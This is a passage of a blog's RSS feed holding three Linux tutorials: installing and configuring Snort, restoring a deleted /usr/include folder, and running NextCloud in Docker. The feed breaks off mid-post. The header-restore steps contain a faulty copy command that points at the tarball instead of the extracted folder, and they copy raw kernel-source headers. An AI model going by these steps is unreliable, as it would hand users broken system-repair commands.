&lt;h1 id=&#34;moving-forward&#34;&gt;Moving Forward&lt;/h1&gt;
&lt;p&gt;For those who are interested in learning Snort on a deeper level, one recommendation is learning how to create your own rules and learning what the other configuration options are. It may be worth it to read their &lt;code&gt;man&lt;/code&gt; page as well to be aware of options available on the CLI. You can also combine Snort with a SIEM such as Splunk and other solutions like pfSense.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h1 id="introduction">Introduction</h1>
<p>Snort is an open source Intrusion Prevention System (IPS) that detects malicious network traffic by comparing the network packets to a set of rules, often created by Snort and the community. Snort can be used as a packet sniffer, packet logger, and intrusion prevention system.</p>
<p>In this article, I’ll go over some of the first steps of installing, configuring, and running Snort so that new users have a place to branch off of.</p>
<h1 id="quick-install">Quick Install</h1>
<p>You can install this on Ubuntu easily with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo apt-get install snort
</span></span></code></pre></div><h2 id="kali-linux">Kali Linux</h2>
<p>For my Kali friends, you might get the message that you’re unable to locate the <code>snort</code> package when trying to install it. This happens because the repositories that your distribution looks into when searching for apt packages doesn’t contain <code>snort</code>. To fix this, you can try to append the following repos to your <code>/etc/apt/sources.list</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>deb http://http.kali.org/kali kali-rolling main non-free contrib  
</span></span><span style="display:flex;"><span>deb http://http.kali.org/kali sana main non-free contrib  
</span></span><span style="display:flex;"><span>deb http://security.kali.org/kali-security sana/updates main contrib non-free  
</span></span><span style="display:flex;"><span>deb http://old.kali.org/kali moto main non-free contrib
</span></span></code></pre></div><p>Let the changes take effect and install Snort.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo apt-get update  
</span></span><span style="display:flex;"><span>$ sudo apt-get install snort
</span></span></code></pre></div><h1 id="building-fromsource">Building From Source</h1>
<p>If you’re crazy enough to build Snort from the source code, this section is for you.</p>
<h2 id="installing-dependencies">Installing Dependencies</h2>
<p>Before you can build Snort, you must first install its dependencies. These are listed in their <a href="https://github.com/snort3/snort3#dependencies">README.md</a> on GitHub, but for the sake of brevity, I’ll put some of them here. Keep in mind that some of the dependencies have more dependencies which is why some appear below and not in the documentation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> apt install <span style="color:#f92672">-</span>y gcc libpcre3<span style="color:#f92672">-</span>dev zlib1g<span style="color:#f92672">-</span>dev libluajit<span style="color:#f92672">-</span><span style="color:#ae81ff">5.1</span><span style="color:#f92672">-</span>dev   
</span></span><span style="display:flex;"><span>libpcap<span style="color:#f92672">-</span>dev openssl libssl<span style="color:#f92672">-</span>dev libnghttp2<span style="color:#f92672">-</span>dev libdumbnet<span style="color:#f92672">-</span>dev   
</span></span><span style="display:flex;"><span>bison flex libdnet autoconf libtool cmake
</span></span></code></pre></div><h2 id="daq">DAQ</h2>
<p>Snort has another depenency called DAQ that needs to be installed. I’ll be downloading their latest release form GitHub and extracting it in a folder called <code>daq</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ wget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.11.zip  
</span></span><span style="display:flex;"><span>$ unzip v3.0.11.zip -d daq &amp;&amp; cd daq/libdaq-3.0.11
</span></span></code></pre></div><p>After downloading and extracting it, I’ll run <code>bootstrap</code> to generate the configuration script and then proceed to install it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ ./bootstrap  
</span></span><span style="display:flex;"><span>$ ./configure &amp;&amp; make &amp;&amp; sudo make install
</span></span></code></pre></div><h2 id="hwloc">hwloc</h2>
<p>Another dependency is <code>hwloc</code>. You can find additional methods of installation on their <a href="https://github.com/open-mpi/hwloc">GitHub</a> and <a href="https://www.open-mpi.org/software/hwloc/v2.9/">website</a>. This is the way that I did it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ git clone https://github.com/open-mpi/hwloc.git  
</span></span><span style="display:flex;"><span>$ cd hwloc &amp;&amp; ./autogen.sh  
</span></span><span style="display:flex;"><span>$ ./configure &amp;&amp; make &amp;&amp; sudo make install
</span></span></code></pre></div><h2 id="openssl">OpenSSL</h2>
<p>If you don’t already have <code>openssl</code> installed on your system, you could install it from source:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ git clone https://github.com/openssl/openssl.git &amp;&amp; cd openssl  
</span></span><span style="display:flex;"><span>$ ./Configure &amp;&amp; make &amp;&amp; make test
</span></span></code></pre></div><p>It is also possible to install it through <code>apt</code>. You may still need to install some additional headers for Snort to work. For this, you can try</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo apt install libssl-dev openssl
</span></span></code></pre></div><h2 id="snort-install">Snort Install</h2>
<p>Finally, we can start building Snort. I’ll be building directly from their source code on GitHub. Following the instructions on their README.md in <a href="https://github.com/snort3/snort3#readme">GitHub</a>, I clone their GitHub repository and run these commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ git clone https://github.com/snort3/snort3.git  
</span></span><span style="display:flex;"><span>$ cd snort3
</span></span></code></pre></div><p>Then, I’ll build the program. You’ll need <code>cmake</code> among other packages in order to do this, so I’ve included the install command for those packages.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#f92672">$</span> sudo apt install <span style="color:#f92672">-</span>y gcc cmake libpcre3<span style="color:#f92672">-</span>dev zlib1g<span style="color:#f92672">-</span>dev libluajit<span style="color:#f92672">-</span><span style="color:#ae81ff">5.1</span><span style="color:#f92672">-</span>dev libpcap<span style="color:#f92672">-</span>dev openssl libssl<span style="color:#f92672">-</span>dev libnghttp2<span style="color:#f92672">-</span>dev libdumbnet<span style="color:#f92672">-</span>dev bison flex autoconf libtool  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> <span style="color:#f92672">./</span>configure\_cmake<span style="color:#f92672">.</span>sh <span style="color:#f92672">--</span>prefix<span style="color:#f92672">=$</span>(pwd) <span style="color:#f92672">--</span>with<span style="color:#f92672">-</span>daq<span style="color:#f92672">-</span>libraries<span style="color:#f92672">=/</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>libdaq<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">11</span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> cd build  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> make <span style="color:#f92672">-</span>j <span style="color:#f92672">$</span>(nproc) install
</span></span></code></pre></div><h1 id="configuration">Configuration</h1>
<h2 id="capturing-all-networktraffic">Capturing all Network Traffic</h2>
<p>To start, we’ll set our network adapter to run in promiscuous mode. This means that it will capture all packets on the network rather than only the ones that were assigned to be captured by it. This can be done through WiFi settings or through the command line.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo ip link set wlan0 promisc on
</span></span></code></pre></div><h2 id="modifying-the-configuration-file">Modifying the Configuration File</h2>
<p>Most configurations will go within <code>/etc/snort/snort.conf</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo vim /etc/snort/snort.conf
</span></span></code></pre></div><p>There’s many configuration options within this file that are broken up into 9 sections. Most of our changes will be in section 1.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*pngRmEDDXcscoXuasWQFdQ.png" alt=""  />

On line 45 of the configuration file, we’ll change the value of <code>HOME_NET</code> from <code>any</code> to be the network that you would like to monitor. In my case, it is <code>192.168.1.0/24</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*uPIpmb3Q2AUJj3v3GkL2lQ.png" alt=""  />

I would encourage you to go through the other variables in the configuration file to include the ports and hosts that are running various services so that Snort can detect them and apply the rules to them.</p>
<p>Rules are included in step #7. The syntax for rule files is <code>include /path/to/rule.rules</code>. In this case, <code>$RULE_PATH</code> refers to <code>/etc/snort</code>. You can include multiple rule files and add your own under <code>/etc/snort/local.rules</code> or whichever file name that you configure for you own rules. This structure allows you to compartmentalize various rule sets and keep them organized.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Pz6IDFwxqQwrMWmZS83kQg.png" alt=""  />

As a side note, if you would like to download the latest community rules, you can find them at the <a href="https://www.snort.org/downloads#rules">official website</a>. You would extract the tarball and add the rule files to your <code>/etc/snort/snort.conf</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#f92672">$</span> wget https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>snort<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>downloads<span style="color:#f92672">/</span>community<span style="color:#f92672">/</span>snort3<span style="color:#f92672">-</span>community<span style="color:#f92672">-</span>rules<span style="color:#f92672">.</span>tar<span style="color:#f92672">.</span>gz  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> tar <span style="color:#f92672">-</span>xf snort3<span style="color:#f92672">-</span>community<span style="color:#f92672">-</span>rules<span style="color:#f92672">.</span>tar<span style="color:#f92672">.</span>gz
</span></span></code></pre></div><h1 id="running-snort">Running Snort</h1>
<p>Once you have your configuration file created, you can test that everything works with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo snort -T -i wlan0 -c /etc/snort/snort.conf
</span></span></code></pre></div><p>You will get a lot of output. The most important pieces of information to be aware of in this output are the Snort rules. Here, you will be able to see how many were loaded in.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4STD2kRrAx3xnRfCA7ALqA.png" alt=""  />

To actually run Snort as a daemon, you would change the <code>-T</code> option to <code>-D</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo snort -D -i eth0 -c /etc/snort/snort.conf  
</span></span><span style="display:flex;"><span>Spawning daemon child...  
</span></span><span style="display:flex;"><span>My daemon child 197993 lives...  
</span></span><span style="display:flex;"><span>Daemon parent exiting (0)
</span></span></code></pre></div><p>To verify that it is working, you can use <code>ps aux</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ ps aux | grep snort  
</span></span><span style="display:flex;"><span>root 196973 0.0 0.3 450316 118644 ? Ssl 10:25 0:00 snort -D -i wlan0 -c /etc/snort/snort.conf
</span></span></code></pre></div><p>All alerts from Snort will be sent to <code>/var/log/snort/alert</code> unless otherwise specified in a command line argument.</p>
<h1 id="moving-forward">Moving Forward</h1>
<p>For those who are interested in learning Snort on a deeper level, one recommendation is learning how to create your own rules and learning what the other configuration options are. It may be worth it to read their <code>man</code> page as well to be aware of options available on the CLI. You can also combine Snort with a SIEM such as Splunk and other solutions like pfSense.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Restoring Files in /usr/include</title>
      <link>https://ally-petitt.com:443/en/posts/2023-04-13_restoring-files-in--usr-include-88622911c3ae/</link>
      <pubDate>Thu, 13 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-04-13_restoring-files-in--usr-include-88622911c3ae/</guid>
      <description>&lt;p&gt;Hi guys, I made a mistake. In my frustration trying to debug my C program, I inadvertently deleted all the files within my &lt;code&gt;/usr/include&lt;/code&gt; folder. I didn’t realize at the time that this was a very important folder! As explained &lt;a href=&#34;https://www.kernel.org/doc/Documentation/kbuild/headers_install.txt&#34;&gt;here&lt;/a&gt;, it stores the Linux kernel’s libc header files! Rookie mistake, but luckily for us, there’s ways to fix it.&lt;/p&gt;
&lt;p&gt;If your &lt;code&gt;/usr/include&lt;/code&gt; folder is also looking more empty than the shelves during COVID, I come bearing the solution.&lt;/p&gt;
&lt;h1 id=&#34;getting-kernelheaders&#34;&gt;Getting Kernel Headers&lt;/h1&gt;
&lt;p&gt;You’ll want to download the kernel install from here: &lt;a href=&#34;https://www.kernel.org/&#34;&gt;https://www.kernel.org/&lt;/a&gt;. Choose the one that matches your Linux kernel version as close as possible. I’ll be using 6.2.10. From there, we’ll decompress the file and copy the contents of the include folder to &lt;code&gt;/usr/include&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# download the linux kernel files form kernel.org  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;cdn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;org&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;pub&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;kernel&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;v6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6.2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xz  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xf linux&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6.2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xz &lt;span style=&#34;color:#75715e&#34;&gt;# decompress the tarball  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# copy the contents of the include folder into /usr/include/  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo cp &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;linux&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6.2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xz&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;include&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;include&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;restoring-additional-missingfiles&#34;&gt;Restoring Additional Missing Files&lt;/h1&gt;
&lt;p&gt;If you find that while compiling something, you still get errors, try this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-file search /path/to/&amp;lt;MISSING\_HEADER&amp;gt;.h
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In my case, I was missing &lt;code&gt;string.h&lt;/code&gt;, so I used &lt;code&gt;apt-file search /usr/include/string.h&lt;/code&gt; to see that I was needing the &lt;code&gt;libc6-dev&lt;/code&gt; library.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*fAw86hUT7orMXK8ZVFfZHQ.png&#34; alt=&#34;&#34;  /&gt;

I had this installed previously, but since I deleted the files, I need to remove the installation completely and reinstall it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt remove --purge libc6-dev  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install libc6-dev
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I also had to do the same with &lt;code&gt;linux-libc-dev&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt remove --purge linux-libc-dev  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install linux-libc-dev
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Continue on with this methodology until you’ve installed all your missing dependencies. With these two steps combined, you should be able to restore your &lt;code&gt;/usr/include&lt;/code&gt; file. This worked for me. Best of luck!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p>Hi guys, I made a mistake. In my frustration trying to debug my C program, I inadvertently deleted all the files within my <code>/usr/include</code> folder. I didn’t realize at the time that this was a very important folder! As explained <a href="https://www.kernel.org/doc/Documentation/kbuild/headers_install.txt">here</a>, it stores the Linux kernel’s libc header files! Rookie mistake, but luckily for us, there’s ways to fix it.</p>
<p>If your <code>/usr/include</code> folder is also looking more empty than the shelves during COVID, I come bearing the solution.</p>
<h1 id="getting-kernelheaders">Getting Kernel Headers</h1>
<p>You’ll want to download the kernel install from here: <a href="https://www.kernel.org/">https://www.kernel.org/</a>. Choose the one that matches your Linux kernel version as close as possible. I’ll be using 6.2.10. From there, we’ll decompress the file and copy the contents of the include folder to <code>/usr/include</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#75715e"># download the linux kernel files form kernel.org  </span>
</span></span><span style="display:flex;"><span>wget https:<span style="color:#f92672">//</span>cdn<span style="color:#f92672">.</span>kernel<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>pub<span style="color:#f92672">/</span>linux<span style="color:#f92672">/</span>kernel<span style="color:#f92672">/</span>v6<span style="color:#f92672">.</span>x<span style="color:#f92672">/</span>linux<span style="color:#f92672">-</span><span style="color:#ae81ff">6.2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10.</span>tar<span style="color:#f92672">.</span>xz  
</span></span><span style="display:flex;"><span>tar <span style="color:#f92672">-</span>xf linux<span style="color:#f92672">-</span><span style="color:#ae81ff">6.2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10.</span>tar<span style="color:#f92672">.</span>xz <span style="color:#75715e"># decompress the tarball  </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># copy the contents of the include folder into /usr/include/  </span>
</span></span><span style="display:flex;"><span>sudo cp <span style="color:#f92672">-</span>r <span style="color:#f92672">./</span>linux<span style="color:#f92672">-</span><span style="color:#ae81ff">6.2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10.</span>tar<span style="color:#f92672">.</span>xz<span style="color:#f92672">/</span>include<span style="color:#f92672">/</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>include<span style="color:#f92672">/</span>
</span></span></code></pre></div><h1 id="restoring-additional-missingfiles">Restoring Additional Missing Files</h1>
<p>If you find that while compiling something, you still get errors, try this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>apt-file search /path/to/&lt;MISSING\_HEADER&gt;.h
</span></span></code></pre></div><p>In my case, I was missing <code>string.h</code>, so I used <code>apt-file search /usr/include/string.h</code> to see that I was needing the <code>libc6-dev</code> library.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*fAw86hUT7orMXK8ZVFfZHQ.png" alt=""  />

I had this installed previously, but since I deleted the files, I need to remove the installation completely and reinstall it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt remove --purge libc6-dev  
</span></span><span style="display:flex;"><span>sudo apt install libc6-dev
</span></span></code></pre></div><p>I also had to do the same with <code>linux-libc-dev</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt remove --purge linux-libc-dev  
</span></span><span style="display:flex;"><span>sudo apt install linux-libc-dev
</span></span></code></pre></div><p>Continue on with this methodology until you’ve installed all your missing dependencies. With these two steps combined, you should be able to restore your <code>/usr/include</code> file. This worked for me. Best of luck!</p>
]]></content:encoded>
    </item>
    <item>
      <title>How to Create and Deploy Your Own Cloud Server with NextCloud</title>
      <link>https://ally-petitt.com:443/en/posts/2023-04-09_how-to-create-and-deploy-your-own-cloud-server-with-nextcloud-345e185d602a/</link>
      <pubDate>Sun, 09 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2023-04-09_how-to-create-and-deploy-your-own-cloud-server-with-nextcloud-345e185d602a/</guid>
      <description>&lt;h1 id=&#34;why-create-a-cloudserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*-WVjY5h4EpphjjX7&#34; alt=&#34;&#34;  /&gt;

Why Create a Cloud Server?&lt;/h1&gt;
&lt;p&gt;As many security-conscious people are aware, saving something in the cloud really means saving it on somebody else’s computer. When using cloud services, you don’t own the data that you upload, nor do you own the program that you’re using. Additionally, it is within the cloud service provider’s rights to delete your data or remove your access to it if they had technical issues, went bankrupt, or you missed a bill. Not all of them will do that, but there is no law protecting the customer from something like this happening. There aren’t any measures in place to prevent the government or corporations from looking through your data and using it for their own objectives (in the US).&lt;/p&gt;
&lt;p&gt;Aside from data security, creating your cloud server provides the opportunity to learn more about how cloud storage works, get practice with hosting a docker container and connecting to it on your LAN, and challenge yourself to do something new.&lt;/p&gt;
&lt;h1 id=&#34;why-nextcloud&#34;&gt;Why NextCloud&lt;/h1&gt;
&lt;p&gt;NextCloud is free and open source. They do not collect or share any of your data. For the paranoid, you can audit the &lt;a href=&#34;https://github.com/nextcloud&#34;&gt;source code&lt;/a&gt; yourself to verify this. The cost of a NextCloud server will be limited to the of the infrastructure that you’re using to host it.&lt;/p&gt;
&lt;h1 id=&#34;my-setup&#34;&gt;My Setup&lt;/h1&gt;
&lt;p&gt;In this demonstration, I’ll be hosting the NextCloud server in a Kali Linux virtual machine. Although I’m using Kali, you can do this on any operating system that allows you to download Docker. I’ll be accessing it through other devices on my LAN.&lt;/p&gt;
&lt;h1 id=&#34;creating-your-docker-container&#34;&gt;Creating Your Docker Container&lt;/h1&gt;
&lt;p&gt;To start, if you don’t already have docker installed, you can find the release for your operating system here: &lt;a href=&#34;https://docs.docker.com/desktop/release-notes/&#34;&gt;https://docs.docker.com/desktop/release-notes/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;pull-and-run-the-nextcloud-container&#34;&gt;Pull and run the NextCloud container&lt;/h2&gt;
&lt;p&gt;To find the versions of NextCloud that are available to you, visit their docker website: &lt;a href=&#34;https://hub.docker.com/_/nextcloud&#34;&gt;https://hub.docker.com/_/nextcloud&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yVUBpaz7cPnubERvyi-o7w.png&#34; alt=&#34;&#34;  /&gt;

In this example, I’ll be using version 24.0.11, but you can substitute with whichever version you’re using.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo docker pull nextcloud:24.0.11
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The output of that command will look like this once it is completed:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*GN-cYnfs54AiOogx8-NAQw.png&#34; alt=&#34;&#34;  /&gt;

Next, I’ll start the container and bind it to port 80 on my Kali VM.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo docker run --name my\_cloud -d -p 80:80 nextcloud:24.0.11 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Explanation:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--name&lt;/code&gt; will set the container name to be &lt;code&gt;my_cloud&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; will run the container in detached mode. This means that the container will run in the background of my terminal instead of displaying all the output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; allows for port-binding from port 80 of the docker container to port 80 of the machine that the container is running on so that we can access it in the browser&lt;/li&gt;
&lt;/ul&gt;
